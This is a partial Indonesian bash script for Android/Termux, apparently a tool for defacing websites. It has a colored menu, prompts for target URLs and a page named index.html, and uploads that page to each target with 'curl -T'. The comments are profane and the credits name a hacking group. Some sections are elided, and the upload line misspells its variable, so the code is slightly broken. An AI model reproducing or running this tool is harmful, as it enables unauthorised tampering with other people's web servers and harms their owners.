#Gila_coding
#Apa Liat² Mau Recode,Sumpah Gk guna lu Anjing
#Buat Sendiri Jangan Mau enaknya Aja kontol
#Recode Lumpuh
green="\033[32;1m"
yellow="\033[33;1m"
indigo="\033[34;1m"
...
echo $indigo"=============================================================="
echo
echo $white "╭─"$yellow"Mr.Devil"$cyan" ~/Dr"$white
read -p " ╰─$ "  apaan
echo
if [ $apaan = "A" ] || [ $apaan = "a" ]
then
...
echo $green "╭─"$blue"Mr.Devil"$cyan" ~/Dr"$white
read -p " ╰─$ "  target
echo
echo $red "Masukan Script nya cok!!! "
echo $green "╭─"$blue"Mr.Devil"$cyan" ~/Nama SC Harus (index.html) ganti dulu sana"$white
read -p " ╰─$ "  script
...
echo
echo "Masukan Script !!!!"
echo $white "╭─"$green"Mr.Devil"$cyan" ~/Dr"$white                               
read -p " ╰─$ " script
echo
echo
...
echo $white "╭─"$green"Mr.Devil"$cyan" ~/Crot"$white
read -p " ╰─$ " target3
...
echo $white "╭─"$green"Mr.Devil"$cyan" ~/Crot"$white
read -p " ╰─$ " target10
curl -T /storage/emulated/0/$sript $target10
...
echo $red"##########################$green" WELCOME "$red###########################"
echo $green"Author   : Mr.Devil			"
echo $purple"Gthub   : https://github.com/BlackCyber091"
echo $white"Youtube  : Dr Cyber Taem"
echo
echo $yellow"                          THANKS TO :"
echo
echo $red"[+] Allah SWT "
echo $white"[+] RanggaHarsya & Dr Bucin "
echo $red"[+] All Member [D.C.T] "
echo $white"[+] All Member [D.C.T] "
echo $red"##########################$green" WELCOME "$red###########################"
